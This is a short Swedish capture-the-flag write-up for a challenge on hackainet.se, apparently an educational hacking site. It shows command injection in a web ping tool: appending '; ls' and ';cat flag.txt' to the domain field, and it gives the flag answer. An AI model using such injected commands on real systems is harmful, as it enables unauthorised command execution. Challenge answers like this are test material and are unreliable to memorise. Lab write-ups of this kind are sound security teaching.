# Flagga 12 - *Medelsvår*
Beskrivning: *Du får ingen hjälp*

Url: *https://hackainet.se/flag12*

## Writeup
Nu verkar vi kommit till en sida där vi kan köra ping-kommandot för olika domäner. Vilket vi kan bekräfta genom att göra en sökning för `google.com`.
![Skärmdump](https://user-images.githubusercontent.com/34009701/236608739-f8eb86ea-6f4f-4f8e-81bc-83931d38de34.png)

Detta gör en intresserad av huruvida man kan lägga till andra kommandon efter ping-kommandot. Vi testar att lägga till `; ls` på slutet av kommandot.

Detta ger oss svaret:
> PING google.com (142.250.74.142) 56(124) bytes of data.
> 
> --- google.com ping statistics ---
> 
> 1 packets transmitted, 0 received, 100% packet loss, time 0ms
> 
> **flag.txt**

På slutet ser vi att det finns en fil som heter flag.txt. Vi testar att läsa den genom att lägga till `;cat flag.txt` på slutet av kommandot.

Svaret blir:
> PING google.com (142.250.74.142) 56(124) bytes of data.
> 
> --- google.com ping statistics ---
> 
> 1 packets transmitted, 0 received, 100% packet loss, time 0ms
> 
> **Snyggt jobbat där! Anders är stolt! flaggan du letar efter: inet_och_eset_gillar_dig**

Flaggan är alltså `inet_och_eset_gillar_dig`
